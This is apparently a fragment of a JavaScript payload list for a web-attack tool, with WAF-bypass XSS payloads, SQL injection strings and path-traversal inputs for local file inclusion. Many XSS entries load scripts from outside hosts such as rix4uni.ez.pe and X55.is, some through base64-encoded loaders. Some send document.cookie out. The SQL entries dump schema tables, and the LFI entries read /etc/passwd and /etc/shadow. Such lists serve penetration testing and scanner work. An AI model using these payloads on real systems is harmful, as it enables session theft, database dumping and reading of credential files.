    { name: "WAF with onscrollsnapchange", payload: "<address onscrollsnapchange=window['ev'+'a'+[[','b','c'][0]])[window['a'+'to'+(['b','c','d'][0]])('YWxlcnQob3JpZ2luKQ=='); style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1</div></address>", tag: "waf" },
    { name: "WAF with onfocusin", payload: "1') \"AutoFocus/ContentEditable/On%0CFocusIn=(conf%0Cirm)(1)//", tag: "waf" },
    { name: "WAF with onfocus", payload: "1'\" AutoFocus One OnFocus=alert(1)//", tag: "waf" },
    { name: "WAF with onerror and confirm", payload: "1'\"--><Img/Src/OnError=(confirm)(1)//<!--", tag: "waf" },
    { name: "WAF with onToggle", payload: "1'\"<!--><%2FTextarea%2F<%2FScript%2F<%2FIframe%2F><Img%2FSrc%2FOnError=%0Bconfirm`K'>", tag: "waf" },
    { name: "WAF with onerror import", payload: "1'\"--><Img/Src/OnError=(confirm)(1)>", tag: "waf" },
    { name: "WAF with onerror and alert", payload: "1'\"<S><A HRef=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt;Title=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt;>", tag: "waf" },
    { name: "WAF with base href", payload: "1'\"><!--><Base Href=//X55.is?", tag: "waf" },
    { name: "WAF with onfocus top", payload: "1'\"><A HRef=\\\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>", tag: "waf" },
    { name: "WAF with onerror import", payload: "1'\"><Img Src=OnXSS OnError=alert(1)>", tag: "waf" },
    { name: "WAF with onfocusin", payload: "1') \"--><K%2FAutofocus%2FContentEditable%2FOnFocusIn%3D%26%2397%26%23108%26%23101%26%23114%26%23116%26%2396%26%2375%26%2396<!--", tag: "waf" },
    { name: "WAF with onload", payload: "1') \"--><Svg/OnLoad=(confirm)(1)<!--", tag: "waf" },
    { name: "WAF with onload 2", payload: "1')\"<!--><Svg OnLoad=(confirm)(1)<!--", tag: "waf" },
    { name: "WAF with onfocusin 2", payload: "1')\"AutoFocus/ContentEditable/On%0CFocusIn=(conf%0Cirm)(1)//", tag: "waf" },
    { name: "WAF with onfocusin 3", payload: "1')\"AutoFocus/ContentEditable/OnFocusIn=(confirm)(1)//", tag: "waf" },
    { name: "WAF with onfocusin script", payload: "1')\"AutoFocus/ContentEditable/OnFocusIn=(document.body.appendChild(document.createElement('script')).src='https://rix4uni.ez.pe')//", tag: "remote" },
    { name: "WAF with confirm literal", payload: "1'-confirm`K`-'", tag: "waf" },
    { name: "WAF with confirm escaped", payload: "1'-top['con\\146irm'](1)-'", tag: "waf" },
    { name: "WAF with onerror script", payload: "1'//\"</Script><Img/Src%0AOnError=alert(1)//", tag: "waf" },
    { name: "WAF with confirm dot", payload: "1'/confirm?.(1)/'", tag: "waf" },
    { name: "WAF with base href", payload: "1'<A/Href=\"//X55.is/><Base/K='0", tag: "waf" },
    { name: "WAF with onerror", payload: "1--></Title/</Style/</Textarea/</Iframe/><Img/Src/OnError=(confirm)(1)//", tag: "waf" },
    { name: "WAF with onload 3", payload: "1<!--><Svg/OnLoad%2B=(confirm)(1)-->", tag: "waf" },
    { name: "WAF with onload 4", payload: "1<!--><Svg/OnLoad=(confirm)(1)-->", tag: "waf" },
    { name: "WAF with confirm dot", payload: "1</Script/><Img/Src/OnError%3Dconfirm?.(1)>", tag: "waf" },
    { name: "WAF with script and comment", payload: "1</Script><Script>1/*'/*\\'/**//alert(1)//", tag: "waf" },
    { name: "WAF with constructor", payload: "1{{$new.constructor('(confirm)(1)')()}}", tag: "waf" },
    { name: "WAF with onerror 2", payload: "6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/", tag: "waf" },
    { name: "WAF with onToggle", payload: ";'\"1<!--></Title/</Textarea/</Script/></Iframe><Details Open OnToggle=_=confirm._(1)-->", tag: "waf" },
    { name: "WAF with onToggle 2", payload: ";'\"1<!--></Title/</Textarea/</Script/></Iframe><Details/Open/OnToggle=(confirm)(1)-->", tag: "waf" },
    { name: "WAF with onerror 3", payload: ";1\"' OnError=(confirm)(1) <!--><Img Src='", tag: "waf" },
    { name: "WAF with onload 5", payload: ";1\">K%2B='><Svg%252FOnLoad%2B=(confirm)(1)>/", tag: "waf" },
    { name: "WAF with onToggle 3", payload: "<!--></Title/</Textarea/</Script/</Iframe/><Details/Open/OnToggle=(confirm)(1)-->%5C", tag: "waf" },
    { name: "WAF with onload 6", payload: "<!--><svg+onload='top[/al/.source+/ert/.source](document.cookie)'>", tag: "waf" },
    { name: "WAF with onfocus 2", payload: "</Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\\\X55.is?1=14357/.source))}//\\76-->", tag: "remote" },
    { name: "WAF with href bypass", payload: "<A %252F=\"\"Href= JavaScript:k='a',top[k%2B'lert'](1)>", tag: "waf" },
    { name: "WAF with onclick", payload: "<a href=\"#\" id=\"uniqueLink\">Click me</a> <script> (function() { var a = ['\\x6F\\x70\\x65\\x6E', '\\x77\\x72\\x69\\x74\\x65', '\\x63\\x6C\\x6F\\x73\\x65', '\\x70\\x72\\x69\\x6E\\x74', '\\x61\\x6C\\x65\\x72\\x74']; var b = ['@', 'h', 'x', 'l', 'x', 'm', 'j']; var c = ['B', '1', 'P', '4', '$', '$']; document.getElementById('uniqueLink').onclick = function() { var w = window[a[0]](); w.document[a[1]](b.join('')); w.document[a[2]](); w[a[3]](); window[a[4]](c.join('')); }; })(); </script>", tag: "waf" },
    { name: "WAF with href import", payload: "<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>", tag: "remote" },
    { name: "WAF with body onload", payload: "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", tag: "waf" },
    { name: "WAF with details eval", payload: "<details open ontoggle=\"eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))\">", tag: "remote" },
    { name: "WAF with details toggle", payload: "<details open ontoggle=\"new Image().src='https://rix4uni.ez.pe?toggle='+document.cookie\"></details>", tag: "steal" },
    { name: "WAF with details open", payload: "<details x=1 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>", tag: "waf" },
    { name: "WAF with details open 2", payload: "<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>", tag: "waf" },
    { name: "WAF with details open 3", payload: "<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>", tag: "waf" },
    { name: "WAF with details open 4", payload: "<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>", tag: "waf" },
    { name: "WAF with details confirm", payload: "<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\\u006efirm);abc(VulneravelXSS%26%2300000000000000000041//", tag: "waf" },
    { name: "WAF with details open 5", payload: "<detalhes%0Aopen%0AonToGgle%0A=%0Aabc=(co\\u006efirm);abc%28%60xss%60%26%230000000000000000041//", tag: "waf" },
    { name: "WAF with div pointerover", payload: "<div onpointerover=\"ja&#x76;ascr&#x69;pt:eva&#x6C;(decodeURICompo&#110;ent(String.fromCharCode(97, 108, 101, 114, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110, 41)))\" style=\"width:100%;height:100vh;\"></div>", tag: "waf" },
    { name: "WAF with div pointerover 2", payload: "<div style=\"width:100%;height:100vh;\" onpointerover=\"[][decodeURIComponent('%63%6F%6E%73%74%72%75%63%74%6F%72')][decodeURIComponent('%63%6F%6E%73%74%72%75%63%74%6F%72')](decodeURIComponent('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29'))()\"> </div>", tag: "waf" },
    { name: "WAF with div pointerover 3", payload: "<DiV sTylE=\"WidTH:100&#37;;HeIgHt:100vH&#59;\" oNpOINteROvEr=\"var _0x1abc=['\\x63','\\x6F','\\x6E','\\x73','\\x74','\\x72','\\x75','\\x63','\\x74','\\x6F','\\x72'];var _0x2bcd=['\\x61','\\x6C','\\x65','\\x72','\\x74','\\x28','\\x64','\\x6F','\\x63','\\x75','\\x6D','\\x65','\\x6E','\\x74','\\x2E','\\x64','\\x6F','\\x6D','\\x61','\\x69','\\x6E','\\x29'];[][_0x1abc.join('')][_0x1abc.join('')](_0x2bcd.join(''))((97^0)===97?1:0);\"></dIV>", tag: "waf" },
    { name: "WAF with img onerror import", payload: "<Img Src=OnXSS Onerror=import(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzc4NiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs'))>", tag: "remote" },
    { name: "WAF with img onerror eval", payload: "<img src=x onerror=\"eval(unescape('%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%27%73%63%72%69%70%74%27%29%29%2E%73%72%63%3D%27%68%74%74%70%73%3A%2F%2F%78%73%73%30%72%2E%63%6F%6D%2F%63%2F%30%78%73%61%62%69%72%27'));\">", tag: "remote" },
    { name: "WAF with img onerror alert", payload: "<img/src/onerror=alert&sol;&sol;(3)>", tag: "waf" },
    { name: "WAF with img onerror 2", payload: "<img/src/onerror=alert//&NewLine;(2)>", tag: "waf" },
    { name: "WAF with img onerror 3", payload: "<img/src/onerror=alert/1/(1)>", tag: "waf" },
    { name: "WAF with img onerror template", payload: "<img/src=x onError=\"${x};alert(Hello);\">", tag: "waf" },
    { name: "WAF with input and eval", payload: "<input id=b value=javascrip> <input id=c value=t:aler> <input id=d value=t(1)> <lol contenteditable onbeforeinput='location=b.value+c.value+d.value'>", tag: "waf" },
    { name: "WAF with script and eval", payload: "<sCrIpT>(function(){var a=[97,108,101,114,116];var b=String.fromCharCode.apply(null,a);var c=[88,115,112,108,111,105,116];var d=String.fromCharCode.apply(null,c);window[b](d);})()</sCrIpT>", tag: "waf" },
    { name: "WAF with script location", payload: "<SCRIPT>location=%27javasCript:alert\\x281\\x29%27</SCRIPT>", tag: "waf" },
    { name: "WAF with select and noembed", payload: "<select><noembed></select><script x='a@b'a> y='a@b'//a@b%0a\\u0061lert('CYBERTIX')</script x>", tag: "waf" },
    { name: "WAF with svg and alert", payload: "<svg onload=\"[]['\\146\\151\\154\\164\\145\\162']['\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162'] ('\\141\\154\\145\\162\\164\\50\\61\\51')()\">", tag: "waf" },
    { name: "WAF with svg onload", payload: "<svg onload='new Function[\"Y000!\"].find(al\\u0065rt)'>", tag: "waf" },
    { name: "WAF with svg onload 2", payload: "<svg onload=(function(){let arr=[41,49,40,116,114,101,108,97].reverse().map(e=>String.fromCharCode(e));let func=new Function(...arr);func();})()>", tag: "waf" },
    { name: "WAF with svg alert", payload: "<svg onload=alert&#0000000040\"1\")><\"\">", tag: "waf" },
    { name: "WAF with svg cookie", payload: "<svg onload=alert&#0000000040document.cookie)>", tag: "steal" },
    { name: "WAF with svg pointerenter", payload: "<sVg OnPointerEnter=\"location=javas+cript:ale+rt%2+81%2+9;//</div\"", tag: "waf" },
    { name: "WAF with svg onload 3", payload: "<Svg+OnLoad=innerHTML=URL,outerHTML=textContent>&#60Img/Src/OnError=alert(1)&#62k", tag: "waf" },
    { name: "WAF with svg onload 4", payload: "<Svg On Only=1 Onload=alert(1)>", tag: "waf" },
    { name: "WAF with svg onload 5", payload: "<svg onload='new Function[\"Y000!\"].find(al\\u0065rt)'>", tag: "waf" },
    { name: "WAF with svg onload 6", payload: "<Svg OnLoad=(confirm)(1)-->", tag: "waf" },
    { name: "WAF with svg onload 7", payload: "<Svg/OnLoad=alert(1)>\"@gmail.com", tag: "waf" },
    { name: "WAF with svg onload 8", payload: "<sVG/oNLY%3d1/**/On+ONloaD%3dco\\u006efirm%26%23x28%3b%26%23x29%3b>", tag: "waf" },
    { name: "WAF with video source", payload: "<vIdeO><sourCe onerror=\"['al\\u0065'+'rt'][0]['\\x63onstructor']['\\x63onstructor']('return this')()[['al\\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])\">", tag: "waf" },
    { name: "WAF with video source 2", payload: "<video><source onerror=\"alert.constructor.constructor('return this')().alert('\\u200f0f')\">", tag: "waf" },
    { name: "WAF with video source 3", payload: "<video><source onerror=\"eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))\">", tag: "remote" },
    { name: "WAF with script src", payload: "><script%20>alert(document.domain)<%2fscript>", tag: "remote" },
    { name: "WAF with script src 2", payload: "`'\"></script></title></textarea><script src=//rix4uni.ez.pe></script>", tag: "remote" },
    { name: "WAF with audio onerror", payload: "`â€™\"><audio src=\"x\" onerror=\"var a=document.createElement('script');a.src='https://rix4uni.ez.pe';document.body.appendChild(a)\">", tag: "remote" },
    { name: "WAF with body onload", payload: "`â€™\"><body onload=\"var a=document.createElement('script');a.src='https://rix4uni.ez.pe';document.body.appendChild(a)\">", tag: "remote" },
    { name: "WAF with iframe", payload: "`â€™\"><iframe src=\"javascript:var a=document.createElement('script');a.src='https://rix4uni.ez.pe';document.body.appendChild(a)\"></iframe>", tag: "remote" },
    { name: "WAF with img onerror", payload: "`â€™\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>", tag: "remote" },
    { name: "WAF with input", payload: "`â€™\"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= autofocus>", tag: "remote" },
    { name: "WAF with script src 3", payload: "`â€™\"><script src=//rix4uni.ez.pe></script>", tag: "remote" },
    { name: "WAF with svg onload", payload: "`â€™\"><svg onload=\"javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://rix4uni.ez.pe\\';document.body.appendChild(a)')\" />", tag: "remote" },
    { name: "WAF with javascript", payload: "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" KaOdcRYSw6jhu\"><script>alert(document.domain)</script>vzsuilert&#x000000028;origin&#x000029;>", tag: "waf" },
    { name: "WAF with javascript 2", payload: "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \"onmouseover=/*<svg*/onload=import(/https:\\rix4uni.ez.pe\\/.source)//>", tag: "remote" },
    { name: "WAF with javascript 3", payload: "JavaScript:\"<Svg/OnLoad=alert%25%0A26lpar;1)>\"", tag: "waf" },
    { name: "WAF with javascript 4", payload: "JavaScript:\"\\%0A74Svg/On%0ALoad=alert%25%0A26lpar;1%25%0A26rpar;>\"", tag: "waf" },
    { name: "WAF with javascript 5", payload: "JavaScript://%0A/*?&apos;/*\\\\&apos;/*&quot; /*\\\\&quot; /**/*\\\\ /*&amp;apos;)/*&lt;!--&gt; &lt;/Title/&lt;/Style/&lt;/Script/&lt;/textArea/&lt;/iFrame/&lt;/noScript&gt;\\\\74k&lt;K/content Editable/autoFocus/OnFocus=/*${/*/{/**/(confirm) (1)}//&gt; &lt; Base/Href=//x55.is\\\\76--&gt;", tag: "waf" },
    { name: "WAF with javascript 6", payload: "JavaScript://%250A/*?'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//rix4uni.ez.pe-->", tag: "remote" },
    { name: "WAF with javascript 7", payload: "JavaScript://%250A/*?'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//rix4uni.ez.pe-->", tag: "remote" },
    { name: "WAF with javascript 8", payload: "JavaScript://%250A/*?'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//X55.is\\76-->", tag: "waf" },
    { name: "WAF with javascript 9", payload: "JavaScript://%250A/*?'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//X55.is\\76-->", tag: "waf" },
    { name: "WAF with javascript 10", payload: "JavaScript://%250Aalert?.(1)//", tag: "waf" },
    { name: "WAF with javascript 11", payload: "JavaScript://%250Aalert?.(1)//'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->", tag: "waf" },
    { name: "WAF with alert split", payload: "'ale'%2B'rt'%2Blocation.hash.substr(1)>#(1)", tag: "waf" },
    { name: "WAF with alert split 2", payload: "'\">alert(154)</script><script/154=;;;;;;;", tag: "waf" },
    { name: "WAF with alert split 3", payload: "'>'%3E%22%3E%script%3Ealert(2);%3C/script%3E", tag: "waf" },
    { name: "WAF with alert split 4", payload: "%27%3E'><script>alert(2);</script>", tag: "waf" },
    { name: "WAF with alert split 5", payload: "%3E'><script>alert(2);</script>", tag: "waf" },
    { name: "WAF with confirm domain", payload: "%3C%2Fscript%3E%3Cscript%3Econfirm%28document.domain%29%3C%2Fscript%3E", tag: "waf" },
    { name: "WAF with img prompt", payload: "\"&gt;&lt;img src=x onerror=prompt(document.domain);&gt;", tag: "waf" },
    { name: "WAF with svg alert", payload: "\"&gt;&lt;svg onload=alert(1)&gt;", tag: "waf" },
    { name: "WAF with script string", payload: "&gt;&lt;/SCRIPT&gt;&gt;'\"&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;", tag: "waf" },

    // === CSS / STYLE BASED ===
    { name: "CSS expression", payload: "<div style=\"xss:expression(alert(1))\">", tag: "css" },
    { name: "CSS import javascript", payload: "<style>@import'javascript:alert(1)';</style>", tag: "css" },
    { name: "CSS selector", payload: "body[xss*=1]{background:url('https://X55.is?1=14357/.source');}", tag: "css" },

    // === REMOTE SCRIPT LOADING VARIANTS ===
    { name: "Remote script import 5", payload: "\"><img/src/onerror=import('//domain/')>\"@gmail.com", tag: "remote" },
    { name: "Remote script import 6", payload: "\"><img/src/onerror=import('//rix4uni.ez.pe')>\"@x.com", tag: "remote" },
    { name: "Remote script import 7", payload: "\"><img/src/onerror=import('//X55.is?1=14357/')>\"@gmail.com", tag: "remote" },
    { name: "Remote script import 8", payload: "\"><script/src=//rix4uni.ez.pe></script>\"@x.com", tag: "remote" },
    { name: "Remote script import 9", payload: "011;ext=<img/src/onerror=import('//domain/')>", tag: "remote" },
    { name: "Remote script import 10", payload: "013371337;ext=<img/src/onerror=import('//rix4uni.ez.pe')>", tag: "remote" },
    { name: "Remote script import 11", payload: "1\"`/import(src)'<Img/Src=//X55.is?1=14357><Img/OnLoad='`", tag: "remote" },
    { name: "Remote script import 12", payload: "1\"`/import(src)'<Script/Src=//X55.is><Img/OnLoad='`", tag: "remote" },
    { name: "Remote script import 13", payload: "1\"`/import(src)'<Script/Src=//X55.is?1=14357><Img/OnLoad='`", tag: "remote" },
    { name: "Remote script import 14", payload: "1'<A/Href=\"//X55.is/><Base/K='0", tag: "remote" },
    { name: "Remote script import 15", payload: "1'\"--><K%2FAutofocus%2FContentEditable%2FOnFocusIn%3D%26%2397%26%23108%26%23101%26%23114%26%23116%26%2396%26%2375%26%2396<!--", tag: "remote" },
    { name: "Remote script import 16", payload: "1'\"--><Svg/OnLoad=(confirm)(1)<!--", tag: "remote" },
    { name: "Remote script import 17", payload: "1')\"AutoFocus/ContentEditable/OnFocusIn=(document.body.appendChild(document.createElement('script')).src='https://rix4uni.ez.pe')//", tag: "remote" },
    { name: "Remote script import 18", payload: "<Script Src=//X55.is>", tag: "remote" },
    { name: "Remote script import 19", payload: "<Script /Src=https://X55.is?1=14357></Script>", tag: "remote" },
    { name: "Remote script import 20", payload: "<script src=//xss.rocks/xss.js></script>", tag: "remote" },
    { name: "Remote script import 21", payload: "<Img Src=\"//X55.is?1=14357/.source\" OnLoad=import(src)>--!>", tag: "remote" },
    { name: "Remote script import 22", payload: "<Img Src=//X55.is OnLoad%0C=import(Src)>", tag: "remote" },
    { name: "Remote script import 23", payload: "<Img Src=//X55.is OnLoad=import(src)>", tag: "remote" },
    { name: "Remote script import 24", payload: "<Img Src=//X55.is?1=14357/.source OnLoad=import(src)>", tag: "remote" },
    { name: "Remote script import 25", payload: "<iframe srcdoc=\"<script src='https://rix4uni.ez.pe'></script>\"></iframe>", tag: "remote" },
  ],

  // ===== SQL INJECTION =====
  SQLi: [
    { name: "Error single quote", payload: "'", tag: "error" },
    { name: "Numeric or", payload: " OR 1=1", tag: "auth" },
    { name: "String or", payload: "' OR '1'='1", tag: "auth" },
    { name: "Admin bypass", payload: "admin'--", tag: "auth" },
    { name: "Union columns 1", payload: "' UNION SELECT NULL--", tag: "union" },
    { name: "Union columns 3", payload: "' UNION SELECT NULL,NULL,NULL--", tag: "union" },
    { name: "Union version", payload: "' UNION SELECT NULL,version(),NULL--", tag: "fingerprint" },
    { name: "Union db user", payload: "' UNION SELECT NULL,current_user(),NULL--", tag: "fingerprint" },
    { name: "Order by test", payload: "' ORDER BY 1--", tag: "columns" },
    { name: "Time sleep MySQL", payload: "' AND SLEEP(5)--", tag: "blind" },
    { name: "Time sleep PG", payload: "'; WAITFOR DELAY '0:0:5'--", tag: "blind" },
    { name: "Time pg sleep", payload: "' AND (SELECT pg_sleep(5))--", tag: "blind" },
    { name: "Comment MySQL", payload: "#", tag: "comment" },
    { name: "Comment generic", payload: "-- -", tag: "comment" },
    { name: "Inline comment", payload: "/**/", tag: "comment" },
    { name: "Stacked query", payload: '; SELECT * FROM users--', tag: "stacked" },
    { name: "Load file", payload: "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--", tag: "file" },
    { name: "Dump table", payload: "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--", tag: "enum" },
    { name: "Dump columns", payload: "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--", tag: "enum" },
    { name: "Boolean true", payload: "' AND 1=1--", tag: "blind" },
    { name: "Boolean false", payload: "' AND 1=2--", tag: "blind" },
    { name: "Union 1,2,3,4,5", payload: " UNION SELECT 1,2,3,4,5--", tag: "union" },
    { name: "Union +SELECT+", payload: "+UNION+SELECT+1,2,3,4,5--", tag: "union" },
    { name: "Union ALL null", payload: " UNION ALL SELECT null,null,null--", tag: "union" },
    { name: "Union parens", payload: " UNION(SELECT(1),(2),(3),(4),(5))--", tag: "union" },
    { name: "Union distinct", payload: " Union Distinctrow Select 1,2,3,4,5--", tag: "union" },
    { name: "Union 13371..", payload: " Union Select 13371,13372,13373--", tag: "union" },
    { name: "Order by", payload: "' ORDER BY 1--", tag: "columns" },
    { name: "Plus ORDER BY", payload: "+ORDER+BY+1--", tag: "columns" },
    { name: "MySQL CHAR()", payload: "CHAR(49,50,51)", tag: "convert" },
    { name: "MSSQL CHAR()", payload: "CHAR(49)+CHAR(50)+CHAR(51)", tag: "convert" },
    { name: "Comment inline /**/", payload: "/**/UNION/**/SELECT/**/", tag: "waf" },
    { name: "DB ver group", payload: "' UNION SELECT NULL,group_concat(version(),0x7c,user(),0x7c,database()),NULL--", tag: "dump" },
    { name: "Dump tables", payload: "' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--", tag: "dump" },
    { name: "Dump columns", payload: "' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name=0x7573657273--", tag: "dump" },
  ],

  // ===== LOCAL FILE INCLUSION =====
LFI: [
  // ==================== LINUX LFI (100+ payloads) ====================
  // ----- /etc/passwd variants (50+) -----
  { name: "passwd 1 deep", payload: "../etc/passwd", tag: "linux" },
  { name: "passwd 2 deep", payload: "../../etc/passwd", tag: "linux" },
  { name: "passwd 3 deep", payload: "../../../etc/passwd", tag: "linux" },
  { name: "passwd 4 deep", payload: "../../../../etc/passwd", tag: "linux" },
  { name: "passwd 5 deep", payload: "../../../../../etc/passwd", tag: "linux" },
  { name: "passwd 6 deep", payload: "../../../../../../etc/passwd", tag: "linux" },
  { name: "passwd 7 deep", payload: "../../../../../../../etc/passwd", tag: "linux" },
  { name: "passwd 8 deep", payload: "../../../../../../../../etc/passwd", tag: "linux" },
  { name: "passwd 9 deep", payload: "../../../../../../../../../etc/passwd", tag: "linux" },
  { name: "passwd 10 deep", payload: "../../../../../../../../../../etc/passwd", tag: "linux" },
  { name: "passwd double dot", payload: "....//....//....//etc/passwd", tag: "linux" },
  { name: "passwd triple dot", payload: ".....///.....///.....///etc/passwd", tag: "linux" },
  { name: "passwd mixed slash", payload: "..\\../..\\../..\\../etc/passwd", tag: "linux" },
  { name: "passwd backslash", payload: "..\\..\\..\\..\\etc\\passwd", tag: "linux" },
  { name: "passwd null", payload: "../../../../etc/passwd%00", tag: "linux" },
  { name: "passwd null double", payload: "../../../../etc/passwd%2500", tag: "linux" },
  { name: "passwd url encoded", payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", tag: "linux" },
  { name: "passwd double url enc", payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", tag: "linux" },
  { name: "passwd unicode 2f", payload: "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd", tag: "linux" },
  { name: "passwd unicode 5c", payload: "..%c0%9c..%c0%9c..%c0%9c..%c0%9cetc/passwd", tag: "linux" },
  { name: "passwd with semicolon", payload: "../../../../etc/passwd;", tag: "linux" },
  { name: "passwd with query", payload: "../../../../etc/passwd?anything", tag: "linux" },
  { name: "passwd with hash", payload: "../../../../etc/passwd#anything", tag: "linux" },
  { name: "passwd with dot trunc", payload: "../../../../etc/passwd/././././././././././.", tag: "linux" },
  { name: "passwd with ..;", payload: "../../../../etc/passwd/..;/..;/..;", tag: "linux" },
  { name: "passwd nested double", payload: "....//....//....//....//etc/passwd", tag: "linux" },
  { name: "passwd absolute path", payload: "/etc/passwd", tag: "linux" },
  { name: "passwd absolute null", payload: "/etc/passwd%00", tag: "linux" },
  { name: "passwd with prefix", payload: "x/../../../../etc/passwd", tag: "linux" },
  { name: "passwd with prefix null", payload: "x/../../../../etc/passwd%00", tag: "linux" },
  { name: "passwd base64 filter", payload: "php://filter/convert.base64-encode/resource=../../../../etc/passwd", tag: "linux" },
  { name: "passwd rot13 filter", payload: "php://filter/read=string.rot13/resource=../../../../etc/passwd", tag: "linux" },
  { name: "passwd iconv filter", payload: "php://filter/convert.iconv.UTF-8.UTF-16/resource=../../../../etc/passwd", tag: "linux" },
  { name: "passwd zip wrapper", payload: "zip://../../../../etc/passwd#anything", tag: "linux" },
  { name: "passwd phar wrapper", payload: "phar://../../../../etc/passwd/anything", tag: "linux" },
  { name: "passwd with null and query", payload: "../../../../etc/passwd%00?anything", tag: "linux" },
  { name: "passwd double encoded null", payload: "..%252f..%252f..%252f..%252fetc%252fpasswd%2500", tag: "linux" },
  { name: "passwd using ..\/", payload: "..\\/..\\/..\\/..\\/etc/passwd", tag: "linux" },
  { name: "passwd using /..", payload: "/../../../../etc/passwd", tag: "linux" },
  { name: "passwd using //", payload: "//../../../../etc/passwd", tag: "linux" },
  { name: "passwd with env var", payload: "../../../../etc/${USER}/passwd", tag: "linux" },
  { name: "passwd with wildcard", payload: "../../../../etc/pa*swd", tag: "linux" },
  { name: "passwd with case var", payload: "../../../../Etc/Passwd", tag: "linux" },
  { name: "passwd with space", payload: "../../../../etc/passwd%20", tag: "linux" },
  { name: "passwd with +", payload: "../../../../etc/passwd+", tag: "linux" },
  { name: "passwd with %0a", payload: "../../../../etc/passwd%0a", tag: "linux" },
  { name: "passwd with %0d", payload: "../../../../etc/passwd%0d", tag: "linux" },
  { name: "passwd with %09", payload: "../../../../etc/passwd%09", tag: "linux" },
  { name: "passwd with %20", payload: "../../../../etc/passwd%20", tag: "linux" },
  { name: "passwd with fake ext", payload: "../../../../etc/passwd.jpg", tag: "linux" },
  { name: "passwd with txt ext", payload: "../../../../etc/passwd.txt", tag: "linux" },

  // ----- Other /etc files -----
  { name: "etc shadow", payload: "../../../../etc/shadow", tag: "linux" },
